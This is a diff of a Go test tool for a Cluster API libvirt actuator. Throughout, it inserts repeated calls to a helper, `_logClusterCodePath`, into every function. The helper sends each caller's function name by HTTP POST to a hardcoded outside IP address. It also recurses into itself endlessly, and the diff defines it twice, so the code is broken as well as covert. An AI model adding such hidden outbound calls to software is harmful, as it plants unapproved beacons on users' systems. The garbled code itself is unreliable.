@@ -34,12 +34,16 @@ const (
 func usage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fmt.Printf("Usage: %s\n\n", os.Args[0])
 }
 
 var rootCmd = &cobra.Command{Use: "libvirt-actuator-test", Short: "Test for Cluster API Libvirt actuator"}
 
 func createCommand() *cobra.Command {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return &cobra.Command{Use: "create", Short: "Create machine instance for specified cluster", RunE: func(cmd *cobra.Command, args []string) error {
@@ -62,6 +66,8 @@ func createCommand() *cobra.Command {
 func deleteCommand() *cobra.Command {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &cobra.Command{Use: "delete INSTANCE-ID", Short: "Delete machine instance", RunE: func(cmd *cobra.Command, args []string) error {
 		if err := checkFlags(cmd); err != nil {
 			return err
@@ -80,6 +86,8 @@ func deleteCommand() *cobra.Command {
 	}}
 }
 func existsCommand() *cobra.Command {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return &cobra.Command{Use: "exists", Short: "Determine if underlying machine instance exists", RunE: func(cmd *cobra.Command, args []string) error {
@@ -106,6 +114,8 @@ func existsCommand() *cobra.Command {
 func BuildPKSecret(secretName, namespace, pkLoc string) (*apiv1.Secret, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pkBytes, err := ioutil.ReadFile(pkLoc)
 	if err != nil {
 		return nil, fmt.Errorf("unable to read %v: %v", pkLoc, err)
@@ -113,6 +123,8 @@ func BuildPKSecret(secretName, namespace, pkLoc string) (*apiv1.Secret, error) {
 	return &apiv1.Secret{ObjectMeta: metav1.ObjectMeta{Name: secretName, Namespace: namespace}, Data: map[string][]byte{"privatekey": pkBytes}}, nil
 }
 func createSecretAndWait(f *framework.Framework, secret *apiv1.Secret) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_, err := f.KubeClient.CoreV1().Secrets(secret.Namespace).Create(secret)
@@ -128,10 +140,14 @@ func createSecretAndWait(f *framework.Framework, secret *apiv1.Secret) error {
 func cmdRun(binaryPath string, args ...string) ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cmd := exec.Command(binaryPath, args...)
 	return cmd.CombinedOutput()
 }
 func bootstrapCommand() *cobra.Command {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cmd := &cobra.Command{Use: "bootstrap", Short: "Bootstrap kubernetes cluster with kubeadm", RunE: func(cmd *cobra.Command, args []string) error {
@@ -249,6 +265,8 @@ func bootstrapCommand() *cobra.Command {
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rootCmd.PersistentFlags().StringP("machine", "m", "", "Machine manifest")
 	rootCmd.PersistentFlags().StringP("cluster", "c", "", "Cluster manifest")
 	rootCmd.PersistentFlags().StringP("userdata", "u", "", "User data manifest")
@@ -268,6 +286,8 @@ func init() {
 func checkFlags(cmd *cobra.Command) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if cmd.Flag("cluster").Value.String() == "" {
 		return fmt.Errorf("--%v/-%v flag is required", cmd.Flag("cluster").Name, cmd.Flag("cluster").Shorthand)
 	}
@@ -279,6 +299,8 @@ func checkFlags(cmd *cobra.Command) error {
 func main() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	err := rootCmd.Execute()
 	if err != nil {
 		glog.Fatalf("Error occurred: %v", err)
@@ -287,7 +309,16 @@ func main() {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
